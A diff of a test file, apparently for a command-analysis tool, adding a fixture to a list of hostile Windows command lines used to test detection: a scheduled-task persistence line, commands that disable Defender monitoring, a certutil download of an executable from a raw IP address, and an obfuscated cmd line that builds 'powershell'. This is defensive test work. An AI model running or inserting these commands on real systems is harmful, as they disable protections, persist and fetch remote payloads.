@@ -364,6 +364,10 @@ describe('banned-word discipline (D6, mirrors doctrine.ts, widened word list)', 
       'Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute powershell)',
       "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\x'",
       'certutil -urlcache -f http://45.9.148.20/a.exe a.exe',
+      // Minor (Task 17 review): exercise the cmd-var-obfuscation-notice
+      // bullet's own copy through the D6 sweep — it was previously only
+      // manually inspected, never run through this assertion.
+      'cmd /c "set x=power&&set y=shell&&%x%%y% -c whoami"',
     ]
     for (const input of fixtures) {
       const r = await analyze(input)
